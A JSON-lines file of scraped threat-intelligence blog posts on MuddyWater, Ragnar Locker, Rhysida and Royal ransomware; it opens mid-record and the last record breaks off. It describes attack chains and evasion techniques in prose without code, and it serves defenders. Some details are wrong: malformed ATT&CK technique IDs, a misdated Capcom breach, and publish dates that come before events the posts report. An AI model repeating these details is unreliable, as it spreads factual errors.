Excel documents (also known as XLS maldocs) and executables stored on a file hosting domain named “snapfile[.]org” that’s delivered to victims via PDF documents with embedded links.\nMuddyWater hosts the maldocs on attacker-controlled or public media-sharing websites which are downloaded by malicious PDFs.\nThe PDFs are distributed via email and are designed to trick targets into downloading and opening them.\nResearch shows that MuddyWater uses malicious PDFs as their entry point for their attacks.\nAdditionally, a set of malicious Excel spreadsheet files were seen distributed with Turkish names, some masquerading as legitimate documents from the Turkish Health and Interior Ministries.\nImage 1: Files with Turkish Names Source: Cisco Talos MuddyWater’s maldocs include malicious VBA macros that are instrumental in the infection chain.\nThis infection chain has three key artifacts on the infected endpoint.\nAccording to Cisco Talos, they include: As stated above, the delivery method for MuddyWater’s malware is done by distributing malicious PDFs with embedded links.\nThe first stage includes the target trying to open the PDF file, which then displays an error message that asks the target to click on a link to resolve the issue.\nAfter clicking the download button, the endpoint receives a second stage which is a Windows executable or a malicious XLS file.\nImage 2: Infection Chain Source: Cisco Talos Sometimes, MuddyWater uses decoy documents in the executable-based threat vector with content that’s similar to the original PDF files disseminating the maldocs and executables.\nMalicious PowerShell scripts are downloaded and executed once the victim opens the document.\nIn this infection chain, intermediate VBS scripts are replaced with a PowerShell implementation, which creates a directory in the victim’s home folder.\nThere are two PowerShell scripts stored in the directory: In August 2021, MuddyWater deployed another version of the executable and targeted Pakistani entities.\nThis version also included a decoy document followed by the use of a PowerShell-based downloader script.\nThe Registry run key is used for persistence.\nIt’s unclear if the Turkish attacks in November 2021 were a continuation of Pakistani-related activity.\nImage 3: Malicious Document Sent to Pakistan Victims Source: Cisco Talos In April 2021, MuddyWater was observed deploying a RAT and the EXE-based infection vector from the Pakistan attack.\nThey were also seen targeting Armenia in June 2021 using the same types of Windows executable files.\nAll of the above campaigns used an implementation of signaling tokens.\nImage 4: MuddyWater Campaigns Observed by Talos Source: Cisco Talos Because MuddyWater has used a variety of lures and has targeted different geographic regions, cyber analysts are saying that MuddyWater is more than likely a conglomerate of subgroups and not a single threat actor.\nThe sub-groups that Cisco Talos observed appear to operate independently and are motivated by espionage, intellectual theft, and destructive or disruptive operations based on their victims.\nThe Turkish, Pakistan, and other campaigns researchers observed, involve the same TTPs - which is evidenced by the gradual adoption of various techniques over time within the campaigns.\nCisco Talos believes there are links between the various campaigns, including MuddyWater’s migration of “techniques from region to region, along with their evolution into more advanced versions.”\nMost nation-state threat actors’ goal is cyber espionage, which makes them a serious threat to the U.S. and other countries.\nWe previously mentioned that cyber espionage is primarily politically motivated and today’s threat landscape is seeing this kind of cyberattack more frequently.\nAlthough it can be difficult for law enforcement to crack down on nation-state threat actors, there has been some success in finding and arresting some groups.\nIn March 2022, Avertium published a report featuring the nation-state threat actor APT40 and their espionage attacks on the maritime, robotics, and biomedical industries.\nThe threat actor has focused their attacks on the U.S., Canada, Europe, the Middle East, and the South China Sea.\nIn July 2019, four members of the group were charged with attacking governments, universities, and various companies across the globe on behalf of the Chinese government.\nThe four suspects were a part of a much larger operation that set up a company (Hainan Xiandun) as a front for their attack campaigns.\nAccording to the Intrusion Truth blog, Hainan Xiandun was under the direction of the Chinese Ministry of State Security (MSS), and an employee, Wu Shurong, worked as a hired hacker for the company.\nShurong created malware and used it to compromise computer systems belonging to universities, governments, and companies.\nThe other three suspects were MSS officers who worked for the Hainan provincial department, their names are Ding Xiaoyang, Cheng Qingmin, and Zhu Yunmin.\nThe U.S. alleged that the MSS has directed Bronze Mohawk’s attack campaigns since 2011 – directing them to steal confidential business information for dissemination in China.\nBronze Mohawk’s attacks were conducted for the sole purpose of leaking sensitive information.\nIn 2021, President Biden stated that one of his goals was to strengthen the nation’s cyber security and bring other countries together to combat cybercrime and improve law enforcement cooperation.\nPresident Biden also acknowledged that securing supply chains and maintaining strong cyber security best practices should be continued work.\nThis statement came after the attack on Kaseya – a supply chain ransomware attack conducted by REvil.\nAlthough the Kaseya attack was a ransomware supply-chain attack, supply chain attacks and nation-state threat actors are often linked.\nIn March 2022, the FBI stopped the Russian-state Cyclops Blink botnet from attacking the U.S. Cyclops Blink is a modular malware that infects internet-connected devices via firmware updates – targeting WatchGuard and ASUS devices.\nCyclops Blink is controlled by the Russian Federation’s Main Intelligence Directorate and has compromised thousands of devices worldwide to date.\nAt the end of 2021, Security Week published an article stating that cyber espionage will remain a primary motive for nation-state adversaries in 2022. “\nHostile state activity will continue to focus primarily on espionage rather than on disruption and destruction.\nSeveral states, notably China, Russia, and Iran, will continue to conduct operations aimed at harvesting bulk data to support subsequent cyber operations and traditional espionage activities.” –\nSecurity Week Threat actors like MuddyWater can gain unlimited access to networks and systems, furthering reconnaissance.\nAvertium is here to keep your organization safe and to mitigate any attacks caused by APTs like MuddyWater: To identify the source of your breach and the scope that it reached; you’ll want to include DFIR (Digital Forensics and Incident Response) services in your protection plan.\nWe offer DFIR to mitigate damage from a successful breach.\nThis service is provided as an on-demand crisis response service, as well as a retainer-based program.\nImplement XDR as a prevention method.\nOur XDR is a combination of monitoring software like LogRhythm, Microsoft Azure Sentinel, or AlienVault, combined with endpoint protection such as SentinelOne.\nXDR platforms enable cybersecurity through a technology focus by collecting, correlating, and analyzing event data from any source on the network.\nThis includes endpoints, applications, network devices, and user interactions.\nMDR provides an in-depth investigation into potential threats to an organization’s network.\nAvertium’s risk-based approach to managed security delivers the right combination of technology, field-validated threat intelligence, and resource empowerment to reduce complexity, streamline operations, and enhance cybersecurity resilience.\nIf you need a more advanced security solution, MDR is the next step.\nMDR is an outsourced security control solution that includes the elements of EDR, enhanced with a range of fundamental security processes.\nAvertium offers Vulnerability Management to provide a deeper understanding and control over organizational information security risks.\nIf your enterprise is facing challenges with the scope, resources, or skills required to implement a vulnerability management program with your team, outsourced solutions can help you bridge the gap.\nAvertium offers user awareness training through KnowBe4.\nThe service also Incident Response Table-Top exercises (IR TTX) and Core Security Document development, as well as a comprehensive new-school approach that integrates baseline testing using mock attacks.\nTabletop Exercises: Have a good cyber incident response plan in place that has been tested with tabletop exercises.\nSecurity Review: Be sure to review the plan and improve it every time it’s tested on real cyber threats.\nRisk Analysis: Prevent an attack by ensuring your organization has a detailed defense strategy based on a risk analysis approach.\nCybersecurity Education: Educate your employees on cyber security preparedness and the dangers of opening potentially malicious documents.\nAnnual or quarterly training modules can help prevent threat actors from tricking employees into opening malicious email attachments. [\nT1548.002] Abuse Elevation Control Mechanism: Bypass User Account Control [T1560.001] Archive Collected Data: Archive via Utility [T1509.001] Command and Scripting Interpreter: PowerShell [T1509.003] Command and Scripting Interpreter: Windows Command Shell [T1555] Credentials from Password Stores [T1041] Exfiltration Over C2 Channel [T1589.002] Gather Victim Identity Information: Email Addresses Canary Tokens File Hashes IPs Cyber Insights 2022: Nation-States | SecurityWeek.\nCom Statement by President Joe Biden on Cybersecurity Awareness Month | The White House Iranian APT: New Methods to Target Turkey, Arabian Peninsula (bankinfosecurity.com) FBI Disrupts Cyclops Blink Botnet Used by Russian Intelligence Directorate (hackread.com) Intellectual Property (IP) Theft Definition & Examples | Awake Security LaZagne, Software S0349 | MITRE ATT&CK® MuddyWater targets Middle Eastern and Asian countries in phishing attacks | TechRepublic U.S. says Iranian 'MuddyWater' cyber actors targeting various sectors worldwide | Reuters Biden Directs ‘Full Resources’ to Respond to Kaseya Ransomware Attack – MeriTalk \"Bronze Mohawk\" & Cyber Espionage (avertium.com) This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.\nCOPYRIGHT: Copyright © Avertium, LLC and/or Avertium Tennessee, Inc. | All rights reserved.","num_sentences":87,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"muddywater"}}
{"id":12,"title":"Ragnar Locker Ransomware (Everything You Need To Know)","publish_date":"2020-04-28","link":"https://www.avertium.com/resources/threat-reports/ragnar-locker-ransomware-attacks-analysis","clean_text":"Executive Summary of ragnar locker ransomware Initially discovered in April 2020, Ragnar Locker is both ransomware and a ransomware gang.\nThe threat actor has been on the Federal Bureau of Investigation's (FBI) radar since the gang breached 52 organizations across 10 critical infrastructure sectors.\nThe critical industries that Ragnar Locker has breached include energy, manufacturing, financial services, government, and information technology.\nRagnar Locker is known for constantly switching up their obfuscation techniques to avoid detection and prevention, as well as deterring organizations from contacting law enforcement after a breach.\nLet’s take a look at Ragnar Locker’s tactics and techniques, and why it’s important to remember the dangers of paying the demanded ransom.\nAlthough Ragnar Locker was discovered by the FBI in April 2020, the group has actually been active since December 2019.\nRagnar Locker is both the name of the ransomware group and the name of the ransomware.\nThe gang works as a part of a ransomware family, which means they are associated with several ransomware variants or threat actor groups.\nRagnar Locker is known for using the double extortion tactic, which involves threat actors exfiltrating sensitive data, then triggering the encryption attack, and ultimately threatening to leak the data if the demanded ransom isn’t paid.\nTo avoid prevention and detection, the threat actor frequently changes their obfuscation techniques.\nRagnar Locker initiates their attacks by compromising the networks of companies through RDP service – using brute force to guess passwords or using stolen credentials purchased on the dark web.\nAfter compromising their target’s network, the threat actor elevates their privileges by exploiting CVE-2017-0213 found in Windows COM Aggregate Marshaler.\nAccording to Microsoft, CVE-2017-0213 is an elevation of privilege that allows attackers to run arbitrary code with elevated privileges.\nTo exploit the vulnerability, the attacker runs a specially crafted application.\nAccording to Acronis, to evade detection, Ragnar Locker will sometimes deploy a VirtualBox virtual machine (VM) with a Windows XP image – this is done to run the ransomware encryption attack (a technique adopted by Maze ransomware operators).\nNext, the image is loaded to the VirtualBox virtual machine, which maps all local drives as read/writable into the virtual machine.\nAs a result, the ransomware process is able to run inside the VM to encrypt files.\nThe host files recognize the encryption as a trusted VirtualBox process, which means that many security products will be ignored.\nNext, Ragnar Locker deletes shadow copies and disables antivirus countermeasures, followed by using a PowerShell script to move from one company network to another.\nBefore the ransomware is deployed, Ragnar Locker steals files and uploads them to servers before publishing them – this is done just in case their victim refuses to pay the demanded ransom.\nObfuscation techniques protect the ransomware code, and those techniques include adding junk code in addition to encryption.\nThe locale information is checked to avoid CIS countries from being infected.\nCrypto keys and obfuscated configuration strings are stored in a payload PE file, which contains a section named “.keys”.\nThe hardcoded obfuscated strings are decrypted in runtime and the first decrypted value is a unique sample ID.\nStrings related to backup and antivirus solutions are terminated, including Sophos and Veeam.\nRagnar Locker also terminates remote management software tools such as Kaseya and ConnectWise, allowing the threat actor to evade detection and ensuring remotely logged-in admins don’t prevent the ransomware deployment process.\nRemote management software is used by managed service providers (MSPs).\nAdditionally, Ragnar Locker leaves a ransomware note behind which provides the address of their leak site, live chat, and Ragnar Secret, which is a ‘company_id’ encoded with Base64.\nRagnar Locker’s stolen data is published to their data leak site from the victim’s corporate network before running Ragnar Locker due to the ransomware not having network communication.\nInterestingly, Ragnar Locker uses a Salsa20 encryption algorithm with a custom matrix.\nThe matrix includes generated keys (placed in rearranged order) and is 64 bytes in size, with 8 bytes defining the stream position.\nRemoving 16 bytes from the second key, Ragnar Locker leaves the stream position values with zero bytes.\nThe encrypted Salsa20 key data can be found in the encrypted file, with the signature _RAGNAR_ added to the footer.\nIn August 2021, Avertium published a Threat Intelligence Report featuring BlackMatter ransomware.\nLike Ragnar Locker, the threat actor used a custom Salsa20 encryption algorithm in their attack against Kaseya.\nThe ransomware gang, DarkSide also used a custom Salsa20 encryption algorithm.\nBlackMatter began making its presence known as a ransomware-as-a-service (RaaS) gang in July 2021, claiming to be a combination of the best qualities of DarkSide and REvil – two ransomware groups that are now defunct.\nThere was also speculation that BlackMatter was a rebrand of DarkSide and REvil because BlackMatter has utilized some of DarkSide and REvil’s tactics.\nDarkSide was responsible for the attack on the Colonial Pipeline, while REvil was responsible for the devastating attack on Kaseya.\nImage 1: Initial State of Salsa20 (Source: Wikipedia.com) While there is no observed direct link between Ragnar Locker, DarkSide, and BlackMatter, it’s important to note that the three groups are using custom Salsa20 encryption algorithms.\nOne of two things is possible – because ransomware gangs like BlackMatter were so successful in the past, more ransomware gangs are starting to use custom Salsa20 encryption algorithms, or there is an undiscovered link between Ragnar Locker, BlackMatter, and DarkSide.\nIn November 2021, the video game giant, Capcom was breached by Ragnar Locker.\nThe ransomware attack affected the company’s email and file servers and encrypted 1 TB of data.\nCapcom is a Japanese video game developer known for several multi-million-dollar game franchises, including Street Fighter and Resident Evil.\nCapcom discovered their breach on November 2, 2021, and confirmed that the attack happened due to unauthorized access by a third party.\nLater in the month, the company confirmed that personal and corporate information (data of former employees, shareholders, store members, and website members) was compromised as well.\nIn addition to Capcom, Ragnar Locker attacked the North American network of Energias de Portugal in April 2021.\nThe gang ended up stealing 10 TB of sensitive company / customer data and insisted on a ransom demand of 1,580 Bitcoin, which is the equivalent of $11 million.\nRagnar Locker was also responsible for breaching the Italian liquor company, Campari Group.\nCampari Group is known for their popular liquor brands, including SKYY Vodka, Wild Turkey, and Grand Marnier.\nOn November 1, 2020, the threat actors stole 2 TB of unencrypted files and demanded a $15 million (in Bitcoin) ransom to recover the files.\nThe files included bank statements, contractual agreements, emails, and much more.\nIn December 2020, Ragnar Locker attacked the aviation giant, Dassault Falcon Jet, which is a subsidiary of the French aerospace company Dassault Aviation.\nIn April 2022, the FBI warned Food and Agriculture (FA) sector organizations that there is an increased risk of ransomware attacks that are more likely to take place during the harvest and planting seasons.\nRansomware gangs target the U.S. constantly, but the FBI was concerned about several groups and possible attacks against FA organizations during critical seasons.\nThe groups include BlackByte, Ragnar Locker, and Avoslocker – all having breached dozens of U.S. critical infrastructure.\nThe FBI is particularly concerned about attacks during the harvest and planting season because the attacks could lead to operation disruptions and have a negative impact on the global food supply chain.\nDuring the fall of 2021, there were ransomware attacks against six-grain cooperatives and two attacks in early 2022.\nThe attacks could have impacted the planting season and disrupted the supply of seeds and fertilizer.\nAttacking the agriculture sector is appealing to threat actors because they know that their targets will be more willing to pay the demanded ransom due to the time-sensitive nature of agriculture production.\nTake a look at the ransomware attacks that disrupted the operations of agriculture in recent years according to the FBI: These kinds of attacks could impact the entire food chain.\nGrain is not just consumed by humans, but by animals as well.\nAlso, significant disruption of corn and grain production will also impact commodities trading and stocks.\nThe International Grains Council has already forecasted that global corn production will drop by 13 million tons in 2022-2023.\nCritical infrastructure attacks by ransomware gangs don’t just cost organizations time and money, they could cost the world its food supply.\nImage 2: Ragnar Locker's Warning Ragnar Locker makes threats against organizations that contact the FBI and heavily encourages their victims to stay quiet.\nTheir letter above states that contacting the FBI doesn’t make the negotiating process safe or easy.\nThey also stated that negotiation companies often work directly with the FBI, so they discourage victims from reaching out to them as well.\nIf victims contact either, the ransomware gang will consider it “hostile intent” and will publish their victims’ stolen data immediately.\nRagnar Locker also makes it clear that if you contact law enforcement or a data recovery company and lie to them about it, they’ll know and will act accordingly.\nAlthough Ragnar Locker makes some pretty strong and aggressive threats, the FBI discourages organizations from paying the ransom.\nTheir warning stated that paying a ransom only encourages threat actors to target additional organizations and gives the green light for other cyber criminals to continue to distribute ransomware.\nPaying the ransom also helps fund the adversary’s illicit activities.\nAfter being breached, most organizations panic and try to keep their breach under wraps by quietly negotiating a ransom payment.\nSometimes, they will use a negotiation service company to help them with this feat.\nHowever, Coveware, a ransomware negotiation company, has found that ransomware gangs aren’t staying true to their word, and they are increasingly not deleting stolen data after ransoms are paid.\nWhile it’s understood that your business operations may be disrupted or even be completely non-functioning, it’s always best to report ransomware incidents to the FBI immediately.\nThe FBI has investigators and analysts, and they need critical information to help track the ransomware attackers, hold them accountable, and prevent future attacks.\nField office contacts can be located at http://www.fbi.gov/contact-us/field-offices.\nEven with anti-malware solutions installed, Ragnar Locker is a great risk to organizations.\nAs you can see, the Ragnar Locker ransomware gang uses advanced defense-evasion techniques to bypass anti-virus software.\nHowever, Avertium has advanced services that can help keep your organization safe: Avertium and the FBI recommend the following for mitigation against Ragnar Locker ransomware: Avertium and the FBI recommend the following guidelines for general ransomware attacks: Bitcoin Addresses IP Addresses File Hashes Websites Threat Actor Profile – “BlackMatter” Ransomware (avertium.com) Analysis of Ragnar Locker Ransomware (acronis.com) FBI Warns of Cyberattacks and Production Drop Forecast for Corn - AG INFORMATION NETWORK OF THE WEST Ragnar Locker Gang Warns Victims Not to Call the FBI | Threatpost CVE-2017-0213 - Security Update Guide - Microsoft - Windows COM Elevation of Privilege Vulnerability Ransom.\nRagnar | Malwarebytes Labs | Detections Campari hit by Ragnar Locker Ransomware, $15 million demanded (bleepingcomputer.com) Microsoft Word - PIN-20220420-001 TLP_WHITE (ic3.gov) FBI warns of ransomware attacks targeting United States agriculture sector (bleepingcomputer.com) Gaming Giant Capcom Hit By Ragnar Locker Ransomware: Report | Threatpost FBI: Ransomware gang breached 52 United S critical infrastructure orgs (bleepingcomputer.com) BlackMatter Ransomware Analysis; The Dark Side Returns (trellix.com) FBI issues IoCs to help organizations defend against RagnarLocker ransomware (scmagazine.com) Microsoft Word - PIN-20220420-001 TLP_WHITE (ic3.gov) This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.\nCOPYRIGHT: Copyright © Avertium, LLC and/or Avertium Tennessee, Inc. | All rights reserved.","num_sentences":87,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"ragnar"}}
{"id":13,"title":"An In-Depth Look at Rhysida Ransomware","publish_date":"2023-05-28","link":"https://www.avertium.com/resources/threat-reports/an-in-depth-look-at-rhysida-ransomware","clean_text":"Lately, Rhysida ransomware has become a serious and mysterious threat to education and other sectors.\nSince it first appeared in May of this year, it has been connected to some major cyberattacks, including one on the Chilean Army.\nAlso, the group expanded its operations to target important healthcare organizations, like the attack on Prospect Medical Holdings, which affected a large network of 17 hospitals and 166 clinics in the U.S. As a result, the U.S. Department of Health and Human Services recognized Rhysida as a significant threat to the sector.\nLet’s explore the tactics and techniques used by Rhysida and focus on ways to detect, prevent, and respond to the group’s attacks.\nRhysida ransomware came to public attention in May 2023.\nThe group has been associated with several significant breaches, including an attack on the Chilean Army where they leaked stolen documents on their data leak site.\nThe threat actor was also linked to an attack on Prospect Medical Holdings, impacting 17 hospitals and 166 clinics across the U.S. Following this attack, the U.S. Department of Health and Human Services (HC3) classified Rhysida as a substantial threat to the healthcare sector.\nRhysida presents itself as a \"cybersecurity team\" with the goal of assisting victims in identifying potential security issues and fortifying their network defenses.\nDespite limited knowledge about the group's origins or national affiliations, the group adopts the name Rhysida, drawing inspiration from the Rhysida genus of centipedes, which is also symbolized in their victim blog's logo.\nTheir TOR page showcases ongoing auctions and provides an overview of their total number of victims.\nAdditionally, the group's website functions as a hub for Rhysida-related news and media coverage.\nThe site also has instructions on how journalists, recovery agencies, or even fans can get in touch with the group.\nImage 1: Rhysida Logo Source: SentinelOne.com The researchers at Check Point analyzed Rhysida ransomware and found striking parallels between the Tactics, Techniques, and Procedures (TTPs) of Rhysida and those of another ransomware group, Vice Society.\nVice Society has been one of the most active and aggressive ransomware groups since 2021, predominantly targeting the education and healthcare sectors.\nIf you recall, Vice Society was responsible for the attack on the Los Angeles Unified School District.\nCheck Point’s analysis reveals both technical similarities between the two groups and a clear correlation between the emergence of Rhysida and the decline of Vice Society.\nAdditionally, both groups share a focus on two prominent sectors within the ransomware landscape: education and healthcare.\nIt's worth noting that the involvement of Vice Society does not imply that Rhysida is exclusively used by them but indicates that the operators of Vice Society have now adopted the Rhysida ransomware.\nIn addition to technical similarities, a notable link emerges when examining the timeline of extortion announcements by Rhysida and Vice Society.\nRhysida's emergence corresponds with a sharp decline in Vice Society's activity.\nThe are several TTPs that Check Point and other researchers have observed being used by Rhysida: According to Check Point and SentinelOne, Rhysida typically gains access to a victim's system through phishing tactics, followed by the use of Cobalt Strike for lateral movement within the system.\nAdditionally, the threat actors use PsExec to deploy both PowerShell scripts and the Rhysida ransomware payload.\nThe PowerShell script, known as g.ps1 and identified as Trojan.\nPS1.SILENTKILL.A, serves various purposes for the threat actors, including terminating antivirus processes and services, erasing shadow copies, altering remote desktop protocol (RDP) configurations, and modifying the active directory (AD) password.\nNotably, during the execution of the script (g.ps1), it appears that the threat actors updated it, ultimately leading to a PowerShell version of Rhysida ransomware.\nRhysida uses a 4096-bit RSA key and AES-CTR for file encryption.\nAfter successfully encrypting files, it appends the .rhysida extension to them and deposits a ransom note named CriticalBreachDetected.pdf.\nThis ransom note has a unique characteristic.\nInstead of a typical ransom demand, as seen in most ransom notes, the Rhysida ransom note takes the form of an alert from the Rhysida \"cybersecurity team,\" informing victims of a compromise to their system and file encryption.\nThe ransom demand is presented as a requirement to obtain a \"unique key\" for file restoration, which the victim is expected to pay for.\nTrend Micro's analysis reveals that Rhysida's encryption process can be summarized as follows: Image 2: Rhysida's Encryption Function Source: Trend Micro Examination of Rhysida ransomware samples indicates that the group is in the early stages of its development cycle.\nThese payloads lack many common features typically found in contemporary ransomware, such as the removal of Volume Shadow Copies (VSS).\nHowever, the group follows the contemporary trend of multi-extortion by threatening victims with the public release of exfiltrated data.\nUpon execution, Rhysida initiates a cmd.exe window, scanning all files across local drives.\nVictims are directed to contact the attackers via a TOR-based portal, using a unique identifier provided in the ransom notes.\nRhysida exclusively accepts Bitcoin (BTC) payments and gives victims guidance on how to get and use BTC via the victim portal.\nAdditionally, victims are prompted to provide further information for authentication and contact purposes.\nRhysida ransom notes are delivered as PDF documents to affected directories on the targeted drives.\nThe ransomware attempts to modify the desktop background through multiple commands, although this feature seems to be non-functional and unreliable in currently examined samples.\nRhysida payloads make use of the ChaCha20 algorithm for file encryption, hinting at potential support for other algorithms in the future, though ChaCha20 is presently the sole fully implemented option.\nOn August 4, 2023, the Health Sector Cybersecurity Coordination Center (HC3) of the U.S. Department of Health and Human Services (HHS) issued a security alert regarding Rhysida (also identified as Ransom.\nPS1.RHYSIDA.SM).\nAccording to the HC3 alert, Rhysida was previously known for targeting the education, government, manufacturing, and technology sectors, but expanded its attacks to include healthcare and public health organizations.\nThe healthcare industry has witnessed a growing number of ransomware incidents over the past half-decade and Rhysida’s attack on Prospect Medical Holdings, a healthcare system in California, was devastating.\nThe attack disrupted the healthcare organization’s computer systems, forcing some emergency rooms to cease operations and ambulances to be diverted.\nAlthough Prospect Medical Holdings is based out of California, they have facilities across several states including Connecticut, Texas, Rhone Island, and Pennsylvania.\nAccording to Trend Micro, Rhysida's operators have shifted their focus from a single industry to multiple sectors from May to August 2023.\nThe threat actor has also extended its reach globally, with Rhysida binaries detected in various countries, including Indonesia, Germany, and the U.S. Detecting Rhysida ransomware requires a combination of technical and operational measures aimed to recognize and flag potentially malicious activities within the network.\nThis approach allows organizations to respond appropriately, preventing or mitigating the impact of a Rhysida ransomware attack.\nTo identify Rhysida ransomware, admins should adopt a multi-faceted strategy, including the following steps: Ultimately, fending off Rhysida ransomware involves following the same core principles as defending against any other ransomware group.\nTime-tested security practices that are effective against ransomware threats in general are equally vital for protecting organizations from ransomware groups like Rhysida.\nSHA1 MD5 SHA256 Initial Access Execution Persistence Defense Evasion Discovery Lateral Movement Impact It’s important to get ahead of the curve by being proactive with protecting your organization, instead of waiting to put out a massive fire.\nAvertium can provide the following services to help keep your organization safe from Rhysida ransomware: Meet Rhysida, a New Ransomware Strain That Deletes Itself (darkreading.com) Rhysida Ransomware Explained: Tactics, Techniques, and Procedures (picussecurity.com) Rhysida ransomware claims recent attack on Prospect Medical, leaks stolen data (axios.com) An Overview of the New Rhysida Ransomware (trendmicro.com) The Rhysida Ransomware: Activity Analysis and Ties to Vice Society - Check Point Research Rhysida Ransomware (trellix.com) 202308041500_Rhysida Ransomware Sector Alert_TLPCLEAR (hhs.gov) An In-Depth Look at Vice Society Ransomware (avertium.com) Rhysida ransomware behind recent attacks on healthcare (bleepingcomputer.com) A cyberattack has disrupted hospitals and health care in several states | AP News Cyberattack hits hospitals across three states (axios.com) Rhysida Ransomware Explained: Tactics, Techniques, and Procedures (picussecurity.com) This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.","num_sentences":56,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"rhysida"}}
{"id":14,"title":"Everything You Need to Know About Royal Ransomware","publish_date":"2022-01-28","link":"https://www.avertium.com/resources/threat-reports/everything-you-need-to-know-about-royal-ransomware","clean_text":"After emerging in January 2022, Royal ransomware is a ransomware strain that is being distributed by ransomware threat actors from previous operations.\nInitially, Microsoft attributed the distribution of Royal ransomware to DEV-0569 – a temporary name given by the tech company.\nNow, researchers are stating that the threat actors behind Royal ransomware have officially branded themselves with the name Royal (the name left behind in recent ransomware notes) and they are primarily focused on targeting entities within the U.S The ransomware operation uses unusual techniques to breach networks before encrypting them with malware and demanding ransom payments.\nSome Royal ransomware campaigns distribute the malware via malicious attachments, and some distribute the malware via malicious advertisements.\nAlthough Royal is a newer ransomware operation, researchers believe the threat actors behind it are very experienced due to evidence of previously seen tactics and techniques.\nLet’s take a look at Royal, their tactics and techniques, and what organizations can do to protect themselves and keep their cyber environments safe.\nIn September 2022, the operators behind Royal ransomware began ramping up their malicious activities.\nThey were observed by our technology partner, AdvIntel, utilizing other ransomware operation’s encryptors, such as BlackCat.\nBy November 2022, Royal took responsibility for a ransomware attack on one of the United Kingdom’s most popular racing circuits – Silverstone Circuit.\nThe attack held up dozens of Formula One races and motorcycle events.\nDetails regarding the attack were not disclosed, but Emsisoft threat analyst Brett Callow stated that because Royal’s ransomware is secure, its encryption cannot be broken.\nCallow also stated that unlike current ransomware groups, Royal uses multiple ransomware types and uses the .Royal extension for encrypted files rather than using randomly generated extensions.\nThe threat actors followed up this attack with an attack on the Travis Central Appraisal District in December 2022.\nThe agency provides appraisal values for properties.\nAs a result of the attack, the agency’s servers, website, and email were shut down for more than two weeks.\nHowever, because the agency diversified where its information was stored, it was able to continue operations.\nAlso in December 2022, the Department of Health and Human Services Cybersecurity Coordination Center (HC3) warned that Royal based ransomware attacks were steadily increasing.\nRansom demands from the threat actor ranged from $250,000 to more than $2 million.\nHC3 also stated that Royal should be considered a threat to the health and public health sectors due to the ransomware group victimizing the healthcare community.\nInitially Royal was using BlackCat’s encryptor but they transitioned to using their own Zeon encryptor, leaving behind a ransomware note that looked very similar to Conti’s ransomware notes.\nIf you recall, Conti was notorious for targeting the healthcare sector as well.\nThe threat actors behind the Zeon encryptor were seen impersonating healthcare patient data software back in October 2022.\nAvertium’s technology partner, AdvIntel confirmed that the attackers contacted healthcare employees of targeted organizations and gained access via the Zoho remote access tool.\nSince the middle of September 2022, Royal has been using their branded name in their ransom notes generated by a new encryptor.\nImage 1: A Zeon Ransomware Note Source: Bleeping Computer Currently, Royal is relying on malicious ads (malvertising), phishing links that point to a malware downloader masquerading as software installers, updates embedded in spam emails, fake forum pages, and blog comments to spread their ransomware.\nThe group’s phishing attacks include callback phishing where they impersonate food delivery and software providers in emails that look like subscription renewals.\nThe phishing emails contain phone numbers that the victim must contact to cancel the “subscription”.\nOnce the victim calls the number, they speak to threat actors who use social engineering to convince the victim to install remote access software.\nThis remote access software is used to gain initial access to corporate networks.\nRoyal are not a ransomware-as-a-service (RaaS) operation with affiliates, rather they work with vetted team members.\nThe group is relatively low key and do not promote their attacks they way some other groups do.\nTheir ransom note is named README.TXT and contains a link to a private Tor negotiation page unique to each victim.\nThe negotiation page consists of a chat screen for communication with Royal ransomware operators.\nDuring negotiation, the group will decrypt a few files to prove that their decryptor works.\nThey will also share file lists of stolen data at times.\nTheir victim site is hosted on the Tor network and includes the victim name, a link to their website and a company profile.\nThe will also post samples of exfiltrated files at the start of negotiations with links to the entire data set in the event that negotiations fail.\nThe following screenshot shows the Royal leak site with a victim that has had all data released and another that is still in negotiations: Image 2: Royal's Newly Branded Ransomware Note Source: Bleeping Computer As previously stated, Royal ransomware emerged in January 2022, but their attacks were not noticed by security researchers until September 2022.\nInitially attributed to DEV-0569, Royal ransomware is distributed by vetted threat actors and the attacks using the ransomware show a pattern of continuous innovation.\nRoyal has displayed a consistent incorporation of new defense evasion, techniques, and various post-compromise payloads.\nSince Royal emerged, the ransomware operators have evolved their delivery methods to include: The above methods have allowed the ransomware operators to reach a greater number of targets and achieve their goal of deploying various post-compromise payloads.\nMicrosoft stated that Royal uses signed binaries and delivers encrypted malware payloads – relying heavily on defense evasion techniques.\nThe group has also continued to use Nsudo, an open-source tool, to try and disable antivirus solutions.\nAs previously stated, Royal has a few ways of gaining initial access and one of those ways is via malicious links delivered to their targets.\nThe links are embedded in advertisements, fake forum pages, phishing emails, and blog comments.\nAfter the victim clicks, the links lead them to malicious files signed by Royal using a legitimate certificate.\nThe malicious files masquerade as installers or updates for applications such as Zoom or Microsoft teams.\nThe victim does not know that the files are malware downloaders known as BATLOADER.\nWhen the legitimate applications are launched, BATLOADER uses MSI Custom Actions to launch malicious PowerShell activity.\nBATLOADER also uses the MSI Custom Actions to run batch scripts that attempt to disable security solutions, leading to the delivery of various encrypted malware payloads.\nBetween August and October 2022, Royal’s observed activity included BATLOADER being hosted on attacker-created domains masquerading as software download sites such as anydeskos[.]com, and on legitimate repositories such as OneDrive and GitHub.\nImage 3: BATLOADER Masquerading as a TeamViewer Installer Source: Microsoft In addition to using installer files, Royal uses file formats 